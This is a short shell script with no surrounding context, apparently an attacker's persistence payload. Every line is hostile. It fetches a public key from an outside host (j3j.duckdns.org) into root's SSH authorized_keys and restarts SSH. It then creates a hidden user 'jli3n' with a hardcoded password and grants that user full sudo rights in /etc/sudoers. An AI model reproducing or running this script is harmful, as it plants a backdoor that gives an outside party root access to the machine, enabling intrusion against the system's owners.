mkdir -p /root/.ssh/
wget -qO- http://j3j.duckdns.org/public_key >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh/
/etc/init.d/ssh restart
/etc/init.d/sshd restart
echo 'Qwe123#21' >> /tmp/j3j.txt
echo 'Qwe123#21' >> /tmp/j3j.txt
useradd jli3n
passwd jli3n < /tmp/j3j.txt
echo 'jli3n	ALL=(ALL:ALL) ALL' >> /etc/sudoers

